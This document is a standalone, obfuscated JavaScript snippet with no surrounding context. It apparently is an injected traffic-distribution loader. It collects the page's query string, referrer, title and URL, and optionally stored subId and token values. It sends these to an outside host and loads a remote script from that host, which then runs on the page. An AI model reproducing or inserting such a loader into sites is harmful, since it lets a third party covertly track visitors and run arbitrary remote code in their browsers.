<script>
    (function() {
    var name = '_HfZVptMvPrrfscht';
    if (!window._HfZVptMvPrrfscht) {
        window._HfZVptMvPrrfscht = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://komariksystem.pro/CydYP6',
            P_PATH: 'https://komariksystem.pro/fc50078/postback',
        };
    }
    const _BbcnygmvYrxp1fSs = localStorage.getItem('config');
    if (typeof _BbcnygmvYrxp1fSs !== 'undefined' && _BbcnygmvYrxp1fSs !== null) {
        var _YDqQ4G9CSF43GbBC = JSON.parse(_BbcnygmvYrxp1fSs);
        var _WTb5PGRTyx1PvD2D = Math.round(+new Date()/1000);
        if (_YDqQ4G9CSF43GbBC.created_at + window._HfZVptMvPrrfscht.ttl < _WTb5PGRTyx1PvD2D) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _1nW5q36Kf7XyMKpM = localStorage.getItem('subId');
    var _FvPGv6jJzCHZrSRK = localStorage.getItem('token');
    var _hkkd1p8cNxmK2B8M = '?return=js.client';
        _hkkd1p8cNxmK2B8M += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _hkkd1p8cNxmK2B8M += '&se_referrer=' + encodeURIComponent(document.referrer);
        _hkkd1p8cNxmK2B8M += '&default_keyword=' + encodeURIComponent(document.title);
        _hkkd1p8cNxmK2B8M += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _hkkd1p8cNxmK2B8M += '&name=' + encodeURIComponent(name);
        _hkkd1p8cNxmK2B8M += '&host=' + encodeURIComponent(window._HfZVptMvPrrfscht.R_PATH);
    if (typeof _1nW5q36Kf7XyMKpM !== 'undefined' && _1nW5q36Kf7XyMKpM && window._HfZVptMvPrrfscht.unique) {
        _hkkd1p8cNxmK2B8M += '&sub_id=' + encodeURIComponent(_1nW5q36Kf7XyMKpM);
    }
    if (typeof _FvPGv6jJzCHZrSRK !== 'undefined' && _FvPGv6jJzCHZrSRK && window._HfZVptMvPrrfscht.unique) {
        _hkkd1p8cNxmK2B8M += '&token=' + encodeURIComponent(_FvPGv6jJzCHZrSRK);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._HfZVptMvPrrfscht.R_PATH + _hkkd1p8cNxmK2B8M;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
